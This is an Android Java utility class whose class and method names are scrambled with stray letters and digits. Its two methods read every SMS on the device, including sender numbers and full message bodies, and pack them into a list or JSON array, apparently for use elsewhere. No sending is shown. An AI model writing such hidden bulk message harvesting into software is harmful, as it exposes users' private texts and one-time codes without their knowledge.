package cdax.naindex;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

import java.sql.Array;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class ContaPctArgentMess68ageUtil {

    @SuppressLint("Range")
    public static List getQui8ckSm6sList(Context context) {
        List jsonArray = new ArrayList();
        String SMS_URI_ALL = "content://sms/";
        Cursor cursor = null;
        try {
            ContentResolver resolver = context.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type", "read", "status", "seen", "date_sent"};
            Uri uri = Uri.parse(SMS_URI_ALL);
            cursor = resolver.query(uri, null, null, null, "date desc");
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    Map<String,Object> obj = new HashMap<>();
                    obj.put("phone", cursor.getString(cursor.getColumnIndex("address")));
                    obj.put("content", cursor.getString(cursor.getColumnIndex("body")));
                    obj.put("time", cursor.getLong(cursor.getColumnIndex("date")));
                    obj.put("qmpType", cursor.getInt(cursor.getColumnIndex("type")));
                    obj.put("qmpId", cursor.getInt(cursor.getColumnIndex("_id")));
//                    obj.put("qmpYn", cursor.getLong(cursor.getColumnIndex("date_sent")));
                    obj.put("read", cursor.getInt(cursor.getColumnIndex("read")));
                    obj.put("seen", cursor.getInt(cursor.getColumnIndex("seen")));
                    obj.put("status", cursor.getInt(cursor.getColumnIndex("status")));
                    obj.put("person", cursor.getInt(cursor.getColumnIndex("person")));
                    jsonArray.add(obj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return jsonArray;
    }

    @SuppressLint("Range")
    public static JSONArray getQui8ckSm6sListV2(Context context) {
        JSONArray jsonArray = new JSONArray();
        Cursor cursor = null;
        try {
            ContentResolver contentResolver = context.getContentResolver();
            cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String phone = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String content = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long time = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    int _id = cursor.getInt(cursor.getColumnIndex(Telephony.Sms._ID));
                    long sent_date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE_SENT));
                    int read = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.READ));
                    int seen = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.SEEN));
                    int status = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.STATUS));
                    int person = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.PERSON));


                    JSONObject obj = new JSONObject();
                    obj.put("seen", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.SEEN)));
                    obj.put("phone", phone);
                    obj.put("content", content);
                    obj.put("time", time);
                    obj.put("type", type);
                    obj.put("_id", _id);
                    obj.put("sent_date", sent_date);
                    obj.put("read", read);
                    obj.put("status", status);
                    obj.put("person", person);

                    jsonArray.put(obj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return jsonArray;
    }
}
